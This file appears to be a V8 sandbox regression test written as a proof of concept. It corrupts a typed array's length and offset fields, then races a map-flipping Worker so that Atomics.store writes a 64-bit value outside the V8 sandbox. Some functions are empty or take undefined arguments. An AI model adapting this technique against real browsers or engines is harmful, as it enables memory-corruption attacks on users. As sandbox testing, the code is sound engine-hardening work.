// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

const kTypedArrayType = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kByteOffsetOff = Sandbox.getFieldOffset(kTypedArrayType, 'byte_offset');
const kByteLengthOff = Sandbox.getFieldOffset(kTypedArrayType, 'byte_length');
function toBigInt() {
}
function makeSandboxMemRW() {
  const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  return {
    u32(addr) {
      return mem.getUint32(addr, true);
    },
    w32(addr, value) {
      mem.setUint32(addr, value >>> 0, true);
    },
    w64(addr, value) {
      mem.setBigUint64(addr, value);
    },
  };
}
class OutSandboxAtomics {
  constructor() {
    const rw = makeSandboxMemRW();
    this.u32 = rw.u32;
    this.w32 = rw.w32;
    this.w64 = rw.w64;
    this.sab = new SharedArrayBuffer();
    this.victim = new BigUint64Array(this.sab);
    this.donorU8 = new Uint8Array();
    this.donorBig = new BigUint64Array();
    this.victimAddr = Sandbox.getAddressOf(this.victim);
    this.mapAddr = this.victimAddr;
    this.mapU8 = this.u32(Sandbox.getAddressOf(this.donorU8));
    this.mapBig = this.u32(Sandbox.getAddressOf(this.donorBig));
    this.w64(this.victimAddr + kByteLengthOff, 0xffffffffffffffffn);
    this.w64(this.victimAddr + kByteOffsetOff, 0xffffffffffffffffn);
    this.startMapFlipper();
  }
  startMapFlipper() {
    function flipper(mapAddr, mapU8) {
      const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
      while (true) {
        mem.setUint32(mapAddr, mapU8, true);
      }
    }
    new Worker(new Function(`(${flipper})(${this.mapAddr}, ${this.mapU8})`), {
      type: 'function',
    });
  }
  forceBigMap() {
    this.w32(this.mapAddr, this.mapBig);
  }
  write64Loop( maxIters = 2_000) {
    const v = value;
    for (let i = 0; i < maxIters; i++) {
      this.forceBigMap();
      try {
        Atomics.store(this.victim, index, v);
      } catch (e) {
      }
    }
  }
}
const p = new OutSandboxAtomics();
function arbWrite64() {
  return p.write64Loop();
}
const index = 33_500_000_000;
const value = 0xdeadbeefdeadbeefn;
arbWrite64();
